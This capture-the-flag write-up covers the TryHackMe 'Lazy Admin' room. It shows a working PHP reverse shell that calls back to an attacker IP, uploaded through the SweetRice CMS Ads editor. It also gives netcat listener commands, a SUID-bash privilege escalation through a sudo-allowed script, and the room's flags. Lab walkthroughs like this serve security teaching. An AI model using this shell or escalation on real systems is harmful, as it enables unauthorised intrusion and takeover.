---
title: "Lazy Admin"        # REQUIRED — short, human readable
platform: "TryHackMe"           # REQUIRED — e.g. TryHackMe, HackTheBox, CTFName
category: "web"                 # OPTIONAL — web / pwn / rev / misc
difficulty: "easy"              # OPTIONAL — easy / medium / hard
date: 2025-10-05                # REQUIRED — YYYY-MM-DD
tags: ["rce","suid","privilege-escalation","sweet-rice"] # OPTIONAL — keywords, keep short
time_spent: "1h"                # OPTIONAL — approximate
license: "CC BY 4.0"            # OPTIONAL — your repo license
-------------------------------------------------------------

# TL;DR

Found an RCE in a SweetRice CMS ads upload: I uploaded a PHP reverse shell via the Ads editor, caught a www-data shell, read the user flag, and abused a sudoable /home/itguy/backup.pl to create a SUID root shell and read the root flag. Results: obtained both the user and root flags.

THM{63e5bce9271952aad1113b6f1ac28a07}  
THM{6637f41d0177b6f37cb20d775124699f}

# Challenge

[TryHackMe - **Lazy Admin**](https://tryhackme.com/room/lazyadmin) - SweetRice CMS vulnerable to RCE via the Ads upload (upload PHP shell), leading to `www-data` access and local privilege escalation using a sudo-allowed `backup.pl` to obtain root.

# What I needed

* **OS:** Linux (Kali/Ubuntu recommended) **Or just the TryHackMe Attackbox**
* **Tools:** nmap, gobuster (or dirb), curl, rlwrap, netcat (nc), python3, hashcat or access to CrackStation, a text editor **Included in the TryHackMe Attackbox**
* **Optional utilities:** rlwrap (for nicer nc shells), hashcat (offline cracking), browseable web browser for CMS interaction **Included in the TryHackMe Attackbox**

# Summary (what you will do)

1. Scan the target to find open services.
2. Enumerate the web server to find hidden paths.
3. Identify the CMS and find a leaked `mysql_backup` file that contains credentials.
4. Crack the password hash, log into the CMS as `manager`.
5. Upload a PHP reverse shell through the CMS Ads functionality.
6. Catch the reverse shell on your machine and get a `www-data` shell.
7. Read the user flag.
8. Use `sudo`-allowed script `backup.pl` to run a root script `/etc/copy.sh` that you control, copy `/bin/bash` to `/tmp/rootbash` and set SUID, then spawn a root shell and read the root flag.

# Preparation - replace these placeholders

Before any command below, replace:

* `<TARGET_IP>` with the IP address shown in your TryHackMe room.
* `<YOUR_IP>` with your attacking machine IP (the machine where you will listen for the shell; on TryHackMe use the IP shown by `ifconfig` / your VPN connection).
* If you use a different listening port than `4444`, replace `4444` accordingly in all commands.

# Step-by-step walkthrough

## 1) Port scan (find open services)

Run an `nmap` service scan and save output:

```bash
nmap -sV -oN ./lazyadmin.nmap <TARGET_IP>
```

**What this does & what to expect:**

* `-sV` probes service versions.
* `-oN ./lazyadmin.nmap` writes human-readable output to `lazyadmin.nmap`.
* Look in the output (also in terminal) for `22` (SSH) and `80` (HTTP). You should see both; focus on `80` (HTTP) because it is usually to get in that way.

To view results (but should be in terminal):

```bash
cat lazyadmin.nmap
```



## 2) Web discovery with gobuster (find hidden folders)

Use `gobuster` to discover directories on the webserver:

```bash
gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

**What to expect / key hits:**

* Look for `/content` (shows `301`) and `/server-status` (403). `/content` is interesting because it is a redirect (403 is not accessable). Go to `http://<TARGET_IP>/content` in your browser.



## 3) Identify CMS (SweetRice)

From the content / page footer or file paths, we see the site runs **SweetRice CMS**. That tells us the probable location of standard files like `inc/` and `ads/`.

**Why this matters:** many older CMSs have known leaks / backup files - check for those paths.

These leaks can be found on sites like https://exploit-db.com/exploits.



## 4) Look for leaked/backup files (mysql_backup)

The public exploit listing referenced `Exploit-DB` entry id `40718`, which points to:

```
/content/inc/mysql_backup/
```

Try to access the path with your browser.

There is a mysql_backup file you can download.
Download it.

Open the downloaded file in an editor.

**What to look for:** user entries, admin usernames, and password hashes. You should find an admin username `manager` and a hashed password string.


## 5) Crack the hash (get the admin password)

Take the hashed password you found and crack it. Two safe options:

### Option A — online (CrackStation)

1. Open [https://crackstation.net](https://crackstation.net) in your browser.
2. Paste the hash and submit.
3. The site will attempt to recover the plaintext password and show it.

### Option B — offline (hashcat) — if you prefer CLI

Save the hash in a file `hash.txt` and run hashcat (only if you have hashcat installed and know the hash type). Example (if it's MD5 (it is)):

```bash
# example only — replace with correct hash mode if known
echo "<HASH_HERE>" > hash.txt
hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt
```

**Result:** you will obtain the plaintext password for `manager`. Save it - you will use it to log in.



## 6) Find the CMS admin login page

You need the CMS login page. You may find it by exploring or by trying likely paths for SweetRice. In this case you found the login at:

```
http://<TARGET_IP>/content/as/
```

Open that page in your browser and enter credentials:

* **Username:** `manager`
* **Password:** (the cracked password)

If login works, you’ll be in the CMS admin dashboard.



## 7) Prepare a PHP reverse shell (get a webshell)

On your attacking machine, copy the provided PHP reverse shell template into your working directory:

```bash
cp /usr/share/webshells/php/php-reverse-shell.php ./php-reverse-shell.php ./
```

If you do not have `/usr/share/webshells`, create the file with the classic PHP reverse shell snippet (example minimal):

```php
<?php
// php-reverse-shell.php - minimal reverse shell
set_time_limit (0);
$ip = '<YOUR_IP>';  // CHANGE THIS
$port = 4444;       // CHANGE THIS
$sock = fsockopen($ip, $port);
$proc = proc_open('/bin/sh -i', array(0 => $sock, 1 => $sock, 2 => $sock), $pipes);
?>
```

**Edit the file to set your IP and port:**

(If you used the stock `php-reverse-shell.php` from webshells package, search for the `$ip = '127.0.0.1';` line and change it to '<YOUR_IP>' and remember the port.)



## 8) Start a listener on your attacking machine

Start netcat (nc) to listen for the reverse shell:

```bash
rlwrap nc -lvnp 4444
```

* `rlwrap` gives readline so the shell is interactive (install `rlwrap` if missing).
* `-l` listen, `-v` verbose, `-n` numeric, `-p 4444` port 4444.

Leave this terminal open and ready to receive the connection.


## 9) Upload the shell via CMS Ads

In the CMS admin panel, find **Ads** (the place where you can add ad content). Create a new Ad entry:

* **Ad name:** Shell
* **Ad code:** paste the full contents of `php-reverse-shell.php` (the PHP code you prepared)

Then **Save** / **Publish** the Ad.

**Why this works:** the CMS will store the Ad code in a file under `/content/inc/ads/` and will execute it when visited, which causes the PHP code to run on the server and initiate a connection back to your listener.



## 10) Trigger the shell and receive connection

Open the file in your browser at (http://<TARGET_IP>/content/inc/ads/) or click the link:

```
http://<TARGET_IP>/content/inc/ads/shell.php
```

As soon as that PHP executes on the server, your netcat listener should show an incoming connection and give you a shell prompt. Example output in listener:

```
connect to [10.10.14.5] from (UNKNOWN) [<TARGET_IP>] 12345
$ whoami
www-data
```

Now you have a remote shell as the web server user `www-data`.



## 11) Enumerate the machine and get the user flag

From your web shell:

```bash
# List the user home directory
ls -la /home/itguy

# Read the user flag
cat /home/itguy/user.txt
```

Save the string printed by the last command — that is the **user flag**.


## 12) Check privileges and look for sudo rights

Check your identity and whether you can run anything with sudo:

```bash
whoami
sudo -l
```

**Important:** `whoami` will typically show `www-data`.
`sudo -l` shows the commands the current user can run as root (if any). In this case you should see that the web user can run:

```
/usr/bin/perl /home/itguy/backup.pl
```

That means you can run that specific Perl script as root.


## 13) Read the backup.pl script to understand what it does

View the script (you can run `cat`):

```bash
cat /home/itguy/backup.pl
```

**What to look for:** lines that call `/etc/copy.sh` or that call a shell. If `backup.pl` calls or executes `/etc/copy.sh` as root (for example `system('/etc/copy.sh')`), then we can control what `/etc/copy.sh` does, and when `backup.pl` runs as root it will execute `/etc/copy.sh` as root.


## 14) Check `/etc/copy.sh` permissions

Check if `/etc/copy.sh` exists and its permissions:

```bash
ls -l /etc/copy.sh
```

**You want to see** whether the file exists and who can write it. If the file is *owned by root* but writable by others (unlikely), you can edit it directly. More commonly, it’s root-owned and not writable by `www-data`.



## 15) Add your payload to `/etc/copy.sh`

The goal is to have `/etc/copy.sh` create a SUID root shell. The payload we want inside `/etc/copy.sh` is:

```bash
cp /bin/bash /tmp/rootbash
chmod +s /tmp/rootbash
```

**Method A - if `/etc/copy.sh` is writable directly by your user:** (recommended)(rare, but works in this case)

```bash
echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' > /etc/copy.sh
```

**Method B - safer and more robust (use sudo tee)**
If you have *any* way to run commands as root or the environment lets you use `sudo`, you can write the file via `tee`. But if you can’t run `sudo` directly, this will fail. However since `sudo -l` indicated you can run `/usr/bin/perl /home/itguy/backup.pl` as root, you can rely on the script running as root to execute `/etc/copy.sh` after you get it in place — see next step.

If you can run `sudo tee` (test whether `sudo` accepts you running tee):

```bash
echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' | sudo tee /etc/copy.sh > /dev/null
```

**Note:** If `sudo tee` works, you have successfully written the payload to `/etc/copy.sh`.

If `sudo tee` does **not** work, you must rely on the fact that `backup.pl` is run as root and may source a copy of `/etc/copy.sh` from a location you can write — check `backup.pl` content to see if it will create `/etc/copy.sh` from a file in `/home/itguy` or from STDIN. If the script reads or copies files from a location you can write, create the file there and let `backup.pl` copy it when executed as root.


## 16) Execute the backup script as root (this will run `/etc/copy.sh`)

Now run the permitted command as root using sudo:

```bash
sudo /usr/bin/perl /home/itguy/backup.pl
```

**What happens:** the `backup.pl` script runs as root and will execute `/etc/copy.sh` as part of its process. Because `/etc/copy.sh` contains commands to copy `/bin/bash` to `/tmp/rootbash` and set the SUID bit, after it runs `/tmp/rootbash` will be owned by root and have the SUID bit set.



## 17) Verify and get a root shell

List `/tmp` to confirm `rootbash` exists:

```bash
ls -la /tmp/rootbash
```

You should see something like `-rwsr-xr-x 1 root root ... /tmp/rootbash` — note the `s` in the owner position (SUID).

Run it with `-p` to preserve privileges and get a root shell:

```bash
/tmp/rootbash -p
```

Now confirm:

```bash
whoami
# should print: root
```


## 18) Read the root flag

Now you can read the root flag:

```bash
cat /root/root.txt
```

Save the flag - that's your second (root) flag and the box is complete.

## 19) Clean up

On TryHackMe you can leave the VM as is. On systems you own, remove any shells or files you uploaded.



# Troubleshooting tips & explanations

## A — Listener didn’t get a connection

* Ensure your firewall allows incoming on the listener port.
* Confirm you set the correct `<YOUR_IP>` in the PHP shell.
* Check that the server actually wrote the file to `/content/inc/ads/shell.php` and that the web path you used is exact.

## B — `echo '...' > /etc/copy.sh` fails with "permission denied"

* That means you don't have permission to write to `/etc`. Try `echo '...' | sudo tee /etc/copy.sh` (if `sudo` lets you run `tee`) or rely on the `backup.pl` script to create/execute `/etc/copy.sh` for you when you run it as root.

## C — `sudo /usr/bin/perl /home/itguy/backup.pl` gives errors

* Re-check the contents of `/home/itguy/backup.pl` with `cat` to understand how it uses `/etc/copy.sh`. If it expects `/etc/copy.sh` to already exist, you must be able to create that file. If it copies from another path, create the source file in that location.

## D — Your reverse shell is weird / limited

* Use `python -c 'import pty; pty.spawn("/bin/bash")'` or `python3 -c 'import pty; pty.spawn("/bin/bash")'` to upgrade an interactive shell.
* Use `stty raw -echo; fg` sequence to make it nicer. (Only after you have a stable shell.)


© 2025 Leander Steffan - CC BY 4.0.
Suggested attribution when reusing or quoting: Content by Leander Steffan - CC BY 4.0 - [https://github.com/LeanderSteffan/ctf-writeups](https://github.com/LeanderSteffan/ctf-writeups)
